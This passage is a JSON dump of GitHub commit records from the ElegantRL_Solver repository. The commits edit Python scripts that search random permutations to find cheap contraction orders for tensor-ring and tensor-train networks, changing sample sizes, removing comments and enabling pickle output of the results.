N)\r\nmin_best = 4e+31\r\nnp.set_printoptions(suppress=True)\r\nfor k in range(num_env):\r\n    best_reward = 4e+31\r\n    for permute_i in range(num_samples):\r\n        permute = th.randperm(N)\r\n        rtp = 0\r\n        state = deepcopy(a[k])\r\n        start = deepcopy(start_[k]) + 1\r\n        end = deepcopy(end_[k]) + 1\r\n        for i in (permute[:-2]):\r\n            r = 1\r\n            print(state)\r\n            if (i == N-1):\r\n                first_node = (i + 1) % N\r\n                second_node = (i + 2) % N\r\n            else:\r\n                first_node = (i + 2) % N\r\n                second_node = (i + 1) % N\r\n            if (first_node == 0):    first_node = N\r\n            if (second_node == 0):    second_node = N\r\n\r\n            if start[i] == 1 or end[i] == N:\r\n                r = r * state[N, 1]\r\n            if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r\n                r = r * state[N, 1]\r\n            tmp1 = start[i]\r\n            tmp2 = start[(i + 1) % N]\r\n            for i in range(N):\r\n                if ((start[i] == tmp1) or (start[i] == tmp2)):\r\n                    r = r * (state[i + 1, i + 1] * state[i + 1, i] * state[i + 2, i + 1])\r\n            r \/= 2\r\n            state[first_node, second_node] = 1\r\n            s1 = 0 + start[i]\r\n            s2 = 0 + start[(i + 1) % N]\r\n            start_new = min(start[i], start[(i + 1) % N])\r\n            end_new = max(end[i], end[(i + 1) % N])\r\n            for i in range(N):\r\n                if ((start[i] == s1) or (start[i] == s2)):\r\n                    start[i] = start_new\r\n                    end[i] = end_new\r\n\r\n            rtp += r\r\n        reward[k, permute_i] = rtp\r\n        # print(permute, permute_i)\r\n        permute_record[k, permute_i] = permute\r\n        best_reward = min(best_reward, rtp - 2 ** (N + 1))\r\n    min_best = min(best_reward, min_best)\r\n\r\n    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n    best_reward_str = str(best_reward.numpy())\r\n    min_best_str = str(min_best.numpy())\r\n    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n    print(best_reward_str, min_best_str)\r\n# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\nprint(reward.min(dim=-1)[0].mean().numpy())\r\n# with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n#     import pickle as pkl\r\n#\r\n#     pkl.dump(reward, f)\r\n# with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n#     import pickle as pkl\r\n#\r\n#     pkl.dump(permute_record, f)\r\n"}},"msg":"Update brute_force.py"},"9c787f074ca6eebe5c19d9cf08aecff0eba26fb8":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/9c787f074ca6eebe5c19d9cf08aecff0eba26fb8","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/9c787f074ca6eebe5c19d9cf08aecff0eba26fb8","sha":"9c787f074ca6eebe5c19d9cf08aecff0eba26fb8","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py\nsimilarity index 79%\nrename from rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\nrename to rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py\nindex 011bb5e..2dc227a 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py\n@@ -5,13 +5,11 @@\n \r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n-# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 6\r\n+N = 100\r\n with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n-# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n-num_samples = 500\r\n+num_samples = 5000\r\n start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n reward = th.zeros(num_env, num_samples)\r\n@@ -65,19 +63,15 @@\n         permute_record[k, permute_i] = permute\r\n         best_reward = min(best_reward, rtp)\r\n     min_best = min(best_reward, min_best)\r\n-\r\n-    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n     best_reward_str = str(best_reward.numpy())\r\n     min_best_str = str(min_best.numpy())\r\n-    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n     print(best_reward_str, min_best_str)\r\n-# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n-# with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n-#     import pickle as pkl\r\n-#\r\n-#     pkl.dump(reward, f)\r\n-# with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n-#     import pickle as pkl\r\n-#\r\n-#     pkl.dump(permute_record, f)\r\n+with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n+    import pickle as pkl\r\n+\r\n+    pkl.dump(reward, f)\r\n+with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n+    import pickle as pkl\r\n+\r\n+    pkl.dump(permute_record, f)\r\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py":{"changes":[{"diff":"\n \r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n-# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n-N = 6\r\n+N = 100\r\n with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n-# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n-num_samples = 500\r\n+num_samples = 5000\r\n start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n reward = th.zeros(num_env, num_samples)\r\n","add":2,"remove":4,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["N = 6\r","num_samples = 500\r"],"goodparts":["N = 100\r","num_samples = 5000\r"]},{"diff":"         permute_record[k, permute_i] = permute\r\n         best_reward = min(best_reward, rtp)\r\n     min_best = min(best_reward, min_best)\r\n-\r\n-    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n     best_reward_str = str(best_reward.numpy())\r\n     min_best_str = str(min_best.numpy())\r\n-    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n     print(best_reward_str, min_best_str)\r\n-# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n-# with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n-#     import pickle as pkl\r\n-#\r\n-#     pkl.dump(reward, f)\r\n-# with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n-#     import pickle as pkl\r\n-#\r\n-#     pkl.dump(permute_record, f)\r\n+with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n+    import pickle as pkl\r\n+\r\n+    pkl.dump(reward, f)\r\n+with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n+    import pickle as pkl\r\n+\r\n+    pkl.dump(permute_record, f)\r\n","add":8,"remove":12,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/brute_force.py","badparts":["\r"],"goodparts":["with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r","    import pickle as pkl\r","\r","    pkl.dump(reward, f)\r","with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r","    import pickle as pkl\r","\r","    pkl.dump(permute_record, f)\r"]}],"source":"\nimport pickle as pkl\r import torch as th\r from copy import deepcopy\r import numpy as np\r \r device=th.device(\"cuda:0\")\r reward=0\r N=6\r with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r a=pkl.load(f).detach().cpu()\r num_env=a.shape[0]\r num_samples=500\r start_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r end_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r reward=th.zeros(num_env, num_samples)\r permute_record=th.zeros(num_env, num_samples, N)\r min_best=4e+31\r np.set_printoptions(suppress=True)\r for k in range(num_env):\r best_reward=4e+31\r for permute_i in range(num_samples):\r permute=th.randperm(N)\r rtp=0\r state=deepcopy(a[k])\r start=deepcopy(start_[k]) +1\r end=deepcopy(end_[k]) +1\r cnt=N\r for i in(permute[:-1]):\r r=1\r if(i==N-1):\r first_node=(i +1) % N\r second_node=(i +2) % N\r else:\r first_node=(i +2) % N\r second_node=(i +1) % N\r if(first_node==0): first_node=N\r if(second_node==0): second_node=N\r if start[i]==1 or end[i]==N:\r r=r * state[N, 1]\r if start[(i +1) % N]==1 or end[(i +1) % N]==N:\r r=r * state[N, 1]\r tmp1=start[i]\r tmp2=start[(i +1) % N]\r for j in range(N):\r if((start[j]==tmp1) or(start[j]==tmp2)):\r r=r *(state[j +1, j +1] * state[j +1, j] * state[j +2, j +1])\r r \/=2\r if(cnt==2):\r r \/=2\r cnt -=1\r state[first_node, second_node]=1\r s1=0 +start[i]\r s2=0 +start[(i +1) % N]\r start_new=min(start[i], start[(i +1) % N])\r end_new=max(end[i], end[(i +1) % N])\r for i in range(N):\r if((start[i]==s1) or(start[i]==s2)):\r start[i]=start_new\r end[i]=end_new\r rtp +=r\r reward[k, permute_i]=rtp\r permute_record[k, permute_i]=permute\r best_reward=min(best_reward, rtp)\r min_best=min(best_reward, min_best)\r \r best_reward_str=str(best_reward.numpy())\r min_best_str=str(min_best.numpy())\r print(best_reward_str, min_best_str)\r print(reward.min(dim=-1)[0].mean().numpy())\r ","sourceWithComments":"import pickle as pkl\r\nimport torch as th\r\nfrom copy import deepcopy\r\nimport numpy as np\r\n\r\ndevice = th.device(\"cuda:0\")\r\nreward = 0\r\n# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\nN = 6\r\nwith open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f).detach().cpu()\r\nnum_env = a.shape[0]\r\n# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\nnum_samples = 500\r\nstart_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nend_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nreward = th.zeros(num_env, num_samples)\r\npermute_record = th.zeros(num_env, num_samples, N)\r\nmin_best = 4e+31\r\nnp.set_printoptions(suppress=True)\r\nfor k in range(num_env):\r\n    best_reward = 4e+31\r\n    for permute_i in range(num_samples):\r\n        permute = th.randperm(N)\r\n        rtp = 0\r\n        state = deepcopy(a[k])\r\n        start = deepcopy(start_[k]) + 1\r\n        end = deepcopy(end_[k]) + 1\r\n        cnt = N\r\n        for i in (permute[:-1]):\r\n            r = 1\r\n            if (i == N-1):\r\n                first_node = (i + 1) % N\r\n                second_node = (i + 2) % N\r\n            else:\r\n                first_node = (i + 2) % N\r\n                second_node = (i + 1) % N\r\n            if (first_node == 0):    first_node = N\r\n            if (second_node == 0):    second_node = N\r\n            if start[i] == 1 or end[i] == N:\r\n                r = r * state[N, 1]\r\n            if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r\n                r = r * state[N, 1]\r\n            tmp1 = start[i]\r\n            tmp2 = start[(i + 1) % N]\r\n            for j in range(N):\r\n                if ((start[j] == tmp1) or (start[j] == tmp2)):\r\n                    r = r * (state[j + 1, j + 1] * state[j + 1, j] * state[j + 2, j + 1])\r\n            r \/= 2\r\n            if (cnt == 2):\r\n                r \/= 2\r\n            cnt -= 1\r\n            state[first_node, second_node] = 1\r\n            s1 = 0 + start[i]\r\n            s2 = 0 + start[(i + 1) % N]\r\n            start_new = min(start[i], start[(i + 1) % N])\r\n            end_new = max(end[i], end[(i + 1) % N])\r\n            for i in range(N):\r\n                if ((start[i] == s1) or (start[i] == s2)):\r\n                    start[i] = start_new\r\n                    end[i] = end_new\r\n            rtp += r\r\n        reward[k, permute_i] = rtp\r\n        # print(permute, permute_i)\r\n        permute_record[k, permute_i] = permute\r\n        best_reward = min(best_reward, rtp)\r\n    min_best = min(best_reward, min_best)\r\n\r\n    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n    best_reward_str = str(best_reward.numpy())\r\n    min_best_str = str(min_best.numpy())\r\n    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n    print(best_reward_str, min_best_str)\r\n# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\nprint(reward.min(dim=-1)[0].mean().numpy())\r\n# with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n#     import pickle as pkl\r\n#\r\n#     pkl.dump(reward, f)\r\n# with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n#     import pickle as pkl\r\n#\r\n#     pkl.dump(permute_record, f)\r\n"}},"msg":"Update and rename brute_force.py to Ring_brute_force.py"},"6478cf904bb0a91a268ef223e317e0ecd54b73f1":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/6478cf904bb0a91a268ef223e317e0ecd54b73f1","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/6478cf904bb0a91a268ef223e317e0ecd54b73f1","sha":"6478cf904bb0a91a268ef223e317e0ecd54b73f1","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py\nindex 2dc227a..75359db 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py\n@@ -69,9 +69,7 @@\n print(reward.min(dim=-1)[0].mean().numpy())\r\n with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(reward, f)\r\n with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(permute_record, f)\r\n","message":"","files":{"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py":{"changes":[{"diff":"\n print(reward.min(dim=-1)[0].mean().numpy())\r\n with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(reward, f)\r\n with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(permute_record, f)\r\n","add":0,"remove":2,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Ring\/Ring_brute_force.py","badparts":["\r","\r"],"goodparts":[]}],"source":"\nimport pickle as pkl\r import torch as th\r from copy import deepcopy\r import numpy as np\r \r device=th.device(\"cuda:0\")\r reward=0\r N=100\r with open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r a=pkl.load(f).detach().cpu()\r num_env=a.shape[0]\r num_samples=5000\r start_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r end_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r reward=th.zeros(num_env, num_samples)\r permute_record=th.zeros(num_env, num_samples, N)\r min_best=4e+31\r np.set_printoptions(suppress=True)\r for k in range(num_env):\r best_reward=4e+31\r for permute_i in range(num_samples):\r permute=th.randperm(N)\r rtp=0\r state=deepcopy(a[k])\r start=deepcopy(start_[k]) +1\r end=deepcopy(end_[k]) +1\r cnt=N\r for i in(permute[:-1]):\r r=1\r if(i==N-1):\r first_node=(i +1) % N\r second_node=(i +2) % N\r else:\r first_node=(i +2) % N\r second_node=(i +1) % N\r if(first_node==0): first_node=N\r if(second_node==0): second_node=N\r if start[i]==1 or end[i]==N:\r r=r * state[N, 1]\r if start[(i +1) % N]==1 or end[(i +1) % N]==N:\r r=r * state[N, 1]\r tmp1=start[i]\r tmp2=start[(i +1) % N]\r for j in range(N):\r if((start[j]==tmp1) or(start[j]==tmp2)):\r r=r *(state[j +1, j +1] * state[j +1, j] * state[j +2, j +1])\r r \/=2\r if(cnt==2):\r r \/=2\r cnt -=1\r state[first_node, second_node]=1\r s1=0 +start[i]\r s2=0 +start[(i +1) % N]\r start_new=min(start[i], start[(i +1) % N])\r end_new=max(end[i], end[(i +1) % N])\r for i in range(N):\r if((start[i]==s1) or(start[i]==s2)):\r start[i]=start_new\r end[i]=end_new\r rtp +=r\r reward[k, permute_i]=rtp\r permute_record[k, permute_i]=permute\r best_reward=min(best_reward, rtp)\r min_best=min(best_reward, min_best)\r best_reward_str=str(best_reward.numpy())\r min_best_str=str(min_best.numpy())\r print(best_reward_str, min_best_str)\r print(reward.min(dim=-1)[0].mean().numpy())\r with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(reward, f)\r with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(permute_record, f)\r ","sourceWithComments":"import pickle as pkl\r\nimport torch as th\r\nfrom copy import deepcopy\r\nimport numpy as np\r\n\r\ndevice = th.device(\"cuda:0\")\r\nreward = 0\r\nN = 100\r\nwith open(f\"test_data_tensor_ring_N={N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f).detach().cpu()\r\nnum_env = a.shape[0]\r\nnum_samples = 5000\r\nstart_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nend_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nreward = th.zeros(num_env, num_samples)\r\npermute_record = th.zeros(num_env, num_samples, N)\r\nmin_best = 4e+31\r\nnp.set_printoptions(suppress=True)\r\nfor k in range(num_env):\r\n    best_reward = 4e+31\r\n    for permute_i in range(num_samples):\r\n        permute = th.randperm(N)\r\n        rtp = 0\r\n        state = deepcopy(a[k])\r\n        start = deepcopy(start_[k]) + 1\r\n        end = deepcopy(end_[k]) + 1\r\n        cnt = N\r\n        for i in (permute[:-1]):\r\n            r = 1\r\n            if (i == N-1):\r\n                first_node = (i + 1) % N\r\n                second_node = (i + 2) % N\r\n            else:\r\n                first_node = (i + 2) % N\r\n                second_node = (i + 1) % N\r\n            if (first_node == 0):    first_node = N\r\n            if (second_node == 0):    second_node = N\r\n            if start[i] == 1 or end[i] == N:\r\n                r = r * state[N, 1]\r\n            if start[(i + 1) % N] == 1 or end[(i + 1) % N] == N:\r\n                r = r * state[N, 1]\r\n            tmp1 = start[i]\r\n            tmp2 = start[(i + 1) % N]\r\n            for j in range(N):\r\n                if ((start[j] == tmp1) or (start[j] == tmp2)):\r\n                    r = r * (state[j + 1, j + 1] * state[j + 1, j] * state[j + 2, j + 1])\r\n            r \/= 2\r\n            if (cnt == 2):\r\n                r \/= 2\r\n            cnt -= 1\r\n            state[first_node, second_node] = 1\r\n            s1 = 0 + start[i]\r\n            s2 = 0 + start[(i + 1) % N]\r\n            start_new = min(start[i], start[(i + 1) % N])\r\n            end_new = max(end[i], end[(i + 1) % N])\r\n            for i in range(N):\r\n                if ((start[i] == s1) or (start[i] == s2)):\r\n                    start[i] = start_new\r\n                    end[i] = end_new\r\n            rtp += r\r\n        reward[k, permute_i] = rtp\r\n        # print(permute, permute_i)\r\n        permute_record[k, permute_i] = permute\r\n        best_reward = min(best_reward, rtp)\r\n    min_best = min(best_reward, min_best)\r\n    best_reward_str = str(best_reward.numpy())\r\n    min_best_str = str(min_best.numpy())\r\n    print(best_reward_str, min_best_str)\r\nprint(reward.min(dim=-1)[0].mean().numpy())\r\nwith open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(reward, f)\r\nwith open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n    import pickle as pkl\r\n\r\n    pkl.dump(permute_record, f)\r\n"}},"msg":"Update Ring_brute_force.py\n\nThe latest version of Ring_brute_force"},"816d7a92f63222bc2c342ec3a7ce5ee006d7ea5e":{"url":"https:\/\/api.github.com\/repos\/AI4Finance-Foundation\/ElegantRL_Solver\/commits\/816d7a92f63222bc2c342ec3a7ce5ee006d7ea5e","html_url":"https:\/\/github.com\/AI4Finance-Foundation\/ElegantRL_Solver\/commit\/816d7a92f63222bc2c342ec3a7ce5ee006d7ea5e","message":"Update brute_force.py\n\nThe latest version of Train_brute_force","sha":"816d7a92f63222bc2c342ec3a7ce5ee006d7ea5e","keyword":"brute force update","diff":"diff --git a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Train\/brute_force.py b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Train\/brute_force.py\nindex fbf2c87..e6623fe 100644\n--- a\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Train\/brute_force.py\n+++ b\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Train\/brute_force.py\n@@ -3,16 +3,12 @@\n from copy import deepcopy\r\n import numpy as np\r\n \r\n-\r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n-# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n N = 100\r\n-\r\n with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n-# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n num_samples = 5000\r\n start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n@@ -47,19 +43,13 @@\n         permute_record[k, permute_i] = permute\r\n         best_reward = min(best_reward, r)\r\n     min_best = min(best_reward, min_best)\r\n-\r\n-    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n     best_reward_str = str(best_reward.numpy())\r\n     min_best_str = str(min_best.numpy())\r\n-    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n     print(best_reward_str, min_best_str)\r\n-# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(reward, f)\r\n with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(permute_record, f)\r\n","files":{"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Train\/brute_force.py":{"changes":[{"diff":"\n from copy import deepcopy\r\n import numpy as np\r\n \r\n-\r\n device = th.device(\"cuda:0\")\r\n reward = 0\r\n-# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\n N = 100\r\n-\r\n with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n     a = pkl.load(f).detach().cpu()\r\n num_env = a.shape[0]\r\n-# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\n num_samples = 5000\r\n start_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n end_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\n","add":0,"remove":4,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Train\/brute_force.py","badparts":["\r","\r"],"goodparts":[]},{"diff":"         permute_record[k, permute_i] = permute\r\n         best_reward = min(best_reward, r)\r\n     min_best = min(best_reward, min_best)\r\n-\r\n-    # print(reward[k], permute_record[k, reward[k].min(dim=-1)[1]], best_reward.numpy(), min_best.numpy())\r\n     best_reward_str = str(best_reward.numpy())\r\n     min_best_str = str(min_best.numpy())\r\n-    # \u5206\u522b\u8f93\u51fa  \u5f53\u524denv\u4e2d\u6700\u4f18\u7684reward\u3001\u6240\u6709env\u4e2d\u6700\u4f18\u7684reward\r\n     print(best_reward_str, min_best_str)\r\n-# \u6240\u6709env\u4e2d\u6700\u4f18reward\u7684\u5e73\u5747\u503c\r\n print(reward.min(dim=-1)[0].mean().numpy())\r\n with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(reward, f)\r\n with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r\n     import pickle as pkl\r\n-\r\n     pkl.dump(permute_record, f)\r\n","add":0,"remove":6,"filename":"\/rlsolver\/rlsolver_quantum_circuits\/Tensor_Train\/brute_force.py","badparts":["\r","\r","\r"],"goodparts":[]}],"source":"\nimport pickle as pkl\r import torch as th\r from copy import deepcopy\r import numpy as np\r \r \r device=th.device(\"cuda:0\")\r reward=0\r N=100\r \r with open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r a=pkl.load(f).detach().cpu()\r num_env=a.shape[0]\r num_samples=5000\r start_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r end_=th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r reward=th.zeros(num_env, num_samples)\r permute_record=th.zeros(num_env, num_samples, N -1)\r min_best=4e+31\r np.set_printoptions(suppress=True)\r for k in range(num_env):\r best_reward=4e+31\r for permute_i in range(num_samples):\r permute=th.randperm(N -1)\r r=0\r state=a[k]\r start=deepcopy(start_[k]) +1\r end=deepcopy(end_[k]) +1\r for i in permute:\r tmp=1\r for j in range(start[i], end[i] +1):\r tmp *=(state[j, j] * state[j, start[i] -1] * state[end[i] +1, j])\r for j in range(start[i +1], end[i +1] +1):\r tmp *=(state[j, j] * state[j, start[i +1] -1] * state[end[i +1] +1, j])\r tmp=tmp \/ state[start[i +1], start[i +1] -1]\r start_new=min(start[i], start[i +1])\r end_new=max(end[i], end[i +1])\r for __ in range(start_new, end_new +1):\r start[__ -1]=start_new\r end[__ -1]=end_new\r \r r +=tmp\r reward[k, permute_i]=r\r permute_record[k, permute_i]=permute\r best_reward=min(best_reward, r)\r min_best=min(best_reward, min_best)\r \r best_reward_str=str(best_reward.numpy())\r min_best_str=str(min_best.numpy())\r print(best_reward_str, min_best_str)\r print(reward.min(dim=-1)[0].mean().numpy())\r with open(\"record_r_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(reward, f)\r with open(\"record_permute_baseline_random.pkl\", \"wb\") as f:\r import pickle as pkl\r \r pkl.dump(permute_record, f)\r ","sourceWithComments":"import pickle as pkl\r\nimport torch as th\r\nfrom copy import deepcopy\r\nimport numpy as np\r\n\r\n\r\ndevice = th.device(\"cuda:0\")\r\nreward = 0\r\n# \u6839\u636e\u5f20\u91cf\u7f51\u7edc\u4e2d\u5f20\u91cf\u6570\u91cf\u8bbe\u5b9a\r\nN = 100\r\n\r\nwith open(f\"test_data_tensor_train_N={N}.pkl\", 'rb') as f:\r\n    a = pkl.load(f).detach().cpu()\r\nnum_env = a.shape[0]\r\n# \u6bcf\u4e2aenv\u4e2d\u5305\u542b\u7684sample\u6570\u91cf\r\nnum_samples = 5000\r\nstart_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nend_ = th.as_tensor([i for i in range(N)]).repeat(1, num_env).reshape(num_env, -1).to(device)\r\nreward = th.zeros(num_env, num_samples)\r\npermute_record = th.zeros(num_env, num_samples, N - 1)\r\nmin_best = 4e+31\r\nnp.set_printoptions(suppress=True)\r\nfor k in range(num_env):\r\n    best_reward = 4e+31\r\n    for permute_i in range(num_samples):\r\n        permute = th.randperm(N - 1)\r\n        r = 0\r\n        state = a[k]\r\n        start = deepcopy(start_[k]) + 1\r\n        end = deepcopy(end_[k]) + 1\r\n        for i in permute:\r\n            tmp = 1\r\n            for j in range(start[i], end[i] + 1):\r\n                tmp *= (state[j, j] * state[j, start[i] - 1] * state[end[i] + 1, j])\r\n            for j in range(start[i + 1], end[i + 1] + 1):\r\n                tmp *= (state[j, j] * 